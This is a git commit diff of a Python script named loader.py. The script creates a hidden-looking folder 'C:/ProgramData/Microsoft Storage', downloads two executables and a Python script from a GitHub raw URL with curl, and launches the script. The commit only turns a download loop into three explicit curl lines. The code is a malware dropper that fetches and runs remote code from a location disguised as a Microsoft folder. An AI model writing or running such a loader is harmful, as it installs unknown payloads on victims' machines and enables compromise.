1a601d4979cfc822f366683c85e1b503daedad0a
Fghth <150439444+Fghthssss@users.noreply.github.com>
2025-11-15 22:16:21 +0300

    Update loader.py

--- loader.py
+++ loader.py
@@ -4,14 +4,9 @@ directory = "C:/ProgramData/Microsoft Storage"
 os.makedirs(directory, exist_ok=True)
 os.chdir(directory)
 
-files = [
-    "clo.exe",
-    "file.exe", 
-    "startup.py"
-]
 
-base_url = "https://raw.githubusercontent.com/Fghghssss/BUSB/refs/heads/main/"
+os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/clo.exe")
+os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/file.exe")
+os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/startup.py")
 
-for file in files:
-    os.system(f"curl -O {base_url}{file}")
 os.system("start startup.py")
